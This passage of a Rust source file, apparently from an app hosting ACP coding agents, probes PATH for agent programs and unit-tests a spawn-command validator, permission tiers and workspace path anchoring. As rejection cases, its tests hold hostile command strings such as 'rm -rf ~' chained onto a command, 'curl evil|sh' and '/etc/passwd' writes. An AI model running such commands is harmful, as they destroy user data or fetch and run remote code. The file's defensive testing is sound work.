        .or_else(|| std::env::var_os("PATH"))?;
    let candidates = program_candidates(program);
    for dir in std::env::split_paths(&value) {
        for candidate in &candidates {
            let full = dir.join(candidate);
            if full.is_file() && is_executable(&full) {
                return Some(full);
            }
        }
    }
    None
}

/// Windows 上程序名不带扩展名时按 PATHEXT 展开；其他平台只有原名。
fn program_candidates(program: &str) -> Vec<String> {
    if !cfg!(windows) || std::path::Path::new(program).extension().is_some() {
        return vec![program.to_string()];
    }
    let pathext = std::env::var("PATHEXT").unwrap_or_else(|_| ".EXE;.CMD;.BAT".to_string());
    let expanded: Vec<String> = pathext
        .split(';')
        .filter(|ext| !ext.is_empty())
        .map(|ext| format!("{program}{ext}"))
        .collect();
    if expanded.is_empty() {
        vec![program.to_string()]
    } else {
        expanded
    }
}

#[cfg(unix)]
fn is_executable(path: &std::path::Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|meta| meta.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(_path: &std::path::Path) -> bool {
    true
}

/// 批量探测 ACP agent 入口程序是否在本机 PATH 上（只读，不启动任何进程）。
///
/// 探测失败（命令缺失等）不该让用户以为「没装」，故返回空数组由前端按未知处理。
#[tauri::command]
pub fn acp_detect_programs(programs: Vec<String>) -> Vec<AgentProgramProbe> {
    const MAX_PROGRAMS: usize = 64;
    programs
        .into_iter()
        .filter(|program| !program.trim().is_empty())
        .take(MAX_PROGRAMS)
        .map(|program| {
            let found = probe_program(&program, None);
            AgentProgramProbe {
                installed: found.is_some(),
                path: found.map(|p| p.to_string_lossy().into_owned()),
                program,
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    use agent_client_protocol::schema::v1::{
        PermissionOption, ToolCallLocation, ToolCallUpdate, ToolCallUpdateFields,
    };

    #[test]
    fn path_probe_hits_executable_and_misses_absent() {
        let dir = std::env::temp_dir().join(format!("gw-probe-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let exe = dir.join("gw-fake-agent");
        std::fs::write(&exe, b"#!/bin/sh\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let path_string = dir.to_string_lossy().into_owned();
        let path_value = std::ffi::OsStr::new(&path_string);

        assert!(probe_program("gw-fake-agent", Some(path_value)).is_some());
        assert!(probe_program("gw-no-such-agent", Some(path_value)).is_none());

        let _ = std::fs::remove_file(&exe);
        let _ = std::fs::remove_dir(&dir);
    }

    #[test]
    fn agent_command_allows_known_programs_and_rejects_injection() {
        assert_eq!(
            process_guard::validate_spawn_command("opencode acp", ALLOWED_AGENT_PROGRAMS).unwrap(),
            "opencode acp"
        );
        assert!(process_guard::validate_spawn_command(
            "npx -y @zed-industries/claude-code-acp",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_ok());
        // shell 元字符 / 链式命令
        assert!(process_guard::validate_spawn_command(
            "opencode acp && rm -rf ~",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_err());
        assert!(
            process_guard::validate_spawn_command("curl evil|sh", ALLOWED_AGENT_PROGRAMS).is_err()
        );
        assert!(process_guard::validate_spawn_command(
            "opencode acp; curl evil",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_err());
        // 相对路径与未知程序
        assert!(
            process_guard::validate_spawn_command("./evil --serve", ALLOWED_AGENT_PROGRAMS)
                .is_err()
        );
        assert!(process_guard::validate_spawn_command(
            "malicious-agent acp",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_err());
        assert!(process_guard::validate_spawn_command("   ", ALLOWED_AGENT_PROGRAMS).is_err());
    }

    #[test]
    fn cwd_rejects_roots_relative_and_missing() {
        assert!(validate_cwd("/").is_err());
        assert!(validate_cwd("C:/").is_err());
        assert!(validate_cwd("relative/path").is_err());
        assert!(validate_cwd("/nonexistent/greywork-cwd-probe").is_err());
        let tmp = std::env::temp_dir();
        assert_eq!(validate_cwd(&tmp.to_string_lossy()).unwrap(), tmp);
    }

    #[test]
    fn tier_parse_maps_new_and_legacy_values() {
        assert_eq!(
            PermissionTier::parse(Some("read-only")),
            PermissionTier::ReadOnly
        );
        assert_eq!(
            PermissionTier::parse(Some("workspace")),
            PermissionTier::Workspace
        );
        assert_eq!(
            PermissionTier::parse(Some("full-access")),
            PermissionTier::Full
        );
        assert_eq!(PermissionTier::parse(Some("full")), PermissionTier::Full);
        // 旧值兼容：daily→Workspace、auto→Full、cautious→ReadOnly（fail-closed）
        assert_eq!(PermissionTier::parse(Some("daily")), PermissionTier::Workspace);
        assert_eq!(PermissionTier::parse(Some("auto")), PermissionTier::Full);
        assert_eq!(
            PermissionTier::parse(Some("cautious")),
            PermissionTier::ReadOnly
        );
        // 未知 / 缺失 fail-closed
        assert_eq!(
            PermissionTier::parse(Some("yolo")),
            PermissionTier::ReadOnly
        );
        assert_eq!(PermissionTier::parse(None), PermissionTier::ReadOnly);
        assert_eq!(PermissionTier::default(), PermissionTier::ReadOnly);
    }

    fn permission_request(kind: Option<ToolKind>, allow: bool) -> RequestPermissionRequest {
        permission_request_at(kind, allow, &[])
    }

    /// 带 locations 的权限请求，用于工作区锚定判定。
    fn permission_request_at(
        kind: Option<ToolKind>,
        allow: bool,
        paths: &[&str],
    ) -> RequestPermissionRequest {
        let option = PermissionOption::new(
            "opt-1",
            if allow { "Allow" } else { "Reject" },
            if allow {
                PermissionOptionKind::AllowOnce
            } else {
                PermissionOptionKind::RejectOnce
            },
        );
        let locations: Vec<ToolCallLocation> = paths
            .iter()
            .map(|path| ToolCallLocation::new(*path))
            .collect();
        let fields = ToolCallUpdateFields::default()
            .kind(kind)
            .locations(Some(locations));
        RequestPermissionRequest::new(
            SessionId::new("sess-1"),
            ToolCallUpdate::new("call-1", fields),
            vec![option],
        )
    }

    fn policy(tier: PermissionTier, root: Option<&str>) -> SessionPolicy {
        SessionPolicy {
            tier,
            workspace_root: root.map(PathBuf::from),
        }
    }

    fn allowed(id: &str) -> PermissionVerdict {
        PermissionVerdict::AutoAllow(PermissionOptionId::from(id.to_string()))
    }

    #[test]
    fn read_only_blocks_writes_and_auto_allows_reads() {
        assert!(is_readonly_kind(Some(ToolKind::Read)));
        assert!(!is_readonly_kind(Some(ToolKind::Execute)));
        assert!(!is_readonly_kind(None));

        let readonly = policy(PermissionTier::ReadOnly, None);
        // 写/执行/未知 → 一律拒绝（不依赖 Allow 选项与锚定）
        for kind in [
            Some(ToolKind::Edit),
            Some(ToolKind::Delete),
            Some(ToolKind::Move),
            Some(ToolKind::Execute),
            None,
        ] {
            assert_eq!(
                decide_permission(&readonly, &permission_request(kind, true)),
                PermissionVerdict::BlockedReadOnly,
                "read-only 档不得放行 {kind:?}"
            );
        }
        // 只读类 + 有 Allow 选项 → 直通
        assert_eq!(
            decide_permission(&readonly, &permission_request(Some(ToolKind::Read), true)),
            allowed("opt-1")
        );
        // 只读但没有 Allow 选项 → 转发前端（可拒绝）
        assert_eq!(
            decide_permission(&readonly, &permission_request(Some(ToolKind::Read), false)),
            PermissionVerdict::Ask
        );
    }

    #[test]
    fn workspace_tier_anchors_writes_and_asks_for_execute() {
        let root = "/home/user/proj";
        let workspace = policy(PermissionTier::Workspace, Some(root));

        // 只读 → 直通
        assert_eq!(
            decide_permission(&workspace, &permission_request(Some(ToolKind::Read), true)),
            allowed("opt-1")
        );
        // 界内写 → 直通（工作区语义：区内自由读写）
        assert_eq!(
            decide_permission(
                &workspace,
                &permission_request_at(Some(ToolKind::Edit), true, &["/home/user/proj/a.ts"])
            ),
            allowed("opt-1")
        );
        // 越界写 → 拦截（不可绕过）
        assert_eq!(
            decide_permission(
                &workspace,
                &permission_request_at(Some(ToolKind::Delete), true, &["/home/user/other/x.ts"])
            ),
            PermissionVerdict::BlockedOutsideWorkspace(vec![PathBuf::from(
                "/home/user/other/x.ts"
            )])
        );
        // Execute（无法静态验证命令目标）→ 逐条确认
        assert_eq!(
            decide_permission(&workspace, &permission_request(Some(ToolKind::Execute), true)),
            PermissionVerdict::Ask
        );
        // 未绑定工作区（无锚定基准）→ 写类逐条确认，不盲放
        let no_root = policy(PermissionTier::Workspace, None);
        assert_eq!(
            decide_permission(
                &no_root,
                &permission_request_at(Some(ToolKind::Edit), true, &["/etc/passwd"])
            ),
            PermissionVerdict::Ask
        );
        // 非写类工具不受锚定约束（读越界按档位直通）
        assert_eq!(
            decide_permission(
                &workspace,
                &permission_request_at(Some(ToolKind::Read), true, &["/etc/passwd"])
            ),
            allowed("opt-1")
        );
    }

    #[test]
    fn full_tier_passes_everything_and_skips_anchor() {
        let root = "/home/user/proj";
        let full = policy(PermissionTier::Full, Some(root));

        // 越界写也不拦——Full 语义即不设工作区边界（前端选择时已警告）
        assert_eq!(
            decide_permission(
                &full,
                &permission_request_at(Some(ToolKind::Edit), true, &["/etc/passwd"])
            ),
            allowed("opt-1")
        );
        // Execute 直通
        assert_eq!(
            decide_permission(&full, &permission_request(Some(ToolKind::Execute), true)),
            allowed("opt-1")
        );
        // 没给 Allow 选项 → 直接取消，不打扰用户
        assert_eq!(
            decide_permission(&full, &permission_request(Some(ToolKind::Execute), false)),
            PermissionVerdict::AutoCancel
        );
    }

    #[test]
    fn session_policy_default_fails_closed() {
        // 未登记 handle 的兜底：ReadOnly（fail-closed）、无锚定基准
        let fallback = SessionPolicy::default();
        assert_eq!(fallback.tier, PermissionTier::ReadOnly);
        assert!(fallback.workspace_root.is_none());
        // 读请求可自动放行（只读档语义），写请求一律拒绝
        assert_eq!(
            decide_permission(&fallback, &permission_request(Some(ToolKind::Read), true)),
            allowed("opt-1")
        );
        assert_eq!(
            decide_permission(&fallback, &permission_request(Some(ToolKind::Edit), true)),
            PermissionVerdict::BlockedReadOnly
        );
    }

    #[tokio::test]
    async fn release_pending_permissions_cancels_only_target_handle() {
        let host = AcpHost::default();
        let (tx_a, rx_a) = oneshot::channel::<PermissionDecision>();
        let (tx_b, rx_b) = oneshot::channel::<PermissionDecision>();
        {
            let mut pending = host.pending_permissions.lock().await;
            pending.insert(
                1,
                PendingPermission {
                    handle: 7,
                    responder: tx_a,
                },
            );
            pending.insert(
                2,
                PendingPermission {
                    handle: 8,
                    responder: tx_b,
                },
            );
        }

        release_pending_permissions(&host, 7).await;

        // handle 7 的待决项被取消并摘除
        assert!(matches!(rx_a.await, Ok(PermissionDecision::Cancel)));
        let pending = host.pending_permissions.lock().await;
        assert!(!pending.contains_key(&1));
        // handle 8 不受影响，仍在等待裁决
        assert!(pending.contains_key(&2));
        drop(rx_b);
    }

    #[tokio::test]
    async fn set_tier_rejects_unknown_handle() {
        // 降级必须能被前端感知失败：未登记 handle 静默成功会让 UI 误报「已降为只读」
        let host = AcpHost::default();
        assert!(host.set_tier(7, PermissionTier::ReadOnly).await.is_err());
    }

    #[test]
    fn normalize_lexical_resolves_dot_and_parent() {
        let base = PathBuf::from("/home/user/proj");
        assert_eq!(normalize_lexical(&base), base);
        assert_eq!(
            normalize_lexical(Path::new("/home/user/proj/./a/../b")),
            PathBuf::from("/home/user/proj/b")
        );
        // 相对路径
        assert_eq!(
            normalize_lexical(Path::new("a/./b/../c")),
            PathBuf::from("a/c")
        );
    }

    #[test]
    fn is_within_componentwise_matching() {
        let base = Path::new("/home/user/proj");
        assert!(is_within(base, Path::new("/home/user/proj/file.ts")));
        assert!(is_within(
            base,
            Path::new("/home/user/proj/sub/dir/../file.ts")
        ));
        // 组件级前缀：proj 不是 proj2 / project-evil 的前缀
        assert!(!is_within(base, Path::new("/home/user/proj2/file.ts")));
        assert!(!is_within(
            base,
            Path::new("/home/user/project-evil/file.ts")
        ));
        // 父目录越界
        assert!(!is_within(base, Path::new("/home/user/other/file.ts")));
        assert!(!is_within(base, Path::new("/etc/passwd")));
        assert!(!is_within(base, Path::new("/home/user/proj/../secret.ts")));
    }

    #[test]
    fn is_write_kind_covers_edit_delete_move_only() {
        assert!(is_write_kind(Some(ToolKind::Edit)));
        assert!(is_write_kind(Some(ToolKind::Delete)));
        assert!(is_write_kind(Some(ToolKind::Move)));
        assert!(!is_write_kind(Some(ToolKind::Read)));
        assert!(!is_write_kind(Some(ToolKind::Execute)));
        assert!(!is_write_kind(None));
    }

    #[test]
    fn blocked_paths_collects_only_outside_locations() {
        let root = Path::new("/home/user/proj");
        let locations = vec![
            ToolCallLocation::new("/home/user/proj/src/main.ts"),
            ToolCallLocation::new("/home/user/proj2/leak.ts"),
            ToolCallLocation::new("/etc/passwd"),
        ];
        let blocked = blocked_paths(root, &locations);
        assert_eq!(blocked.len(), 2);
        assert_eq!(blocked[0], PathBuf::from("/home/user/proj2/leak.ts"));
        assert_eq!(blocked[1], PathBuf::from("/etc/passwd"));

        assert!(blocked_paths(root, &[ToolCallLocation::new("/home/user/proj/a.ts")]).is_empty());
        assert!(blocked_paths(root, &[]).is_empty());
    }
}
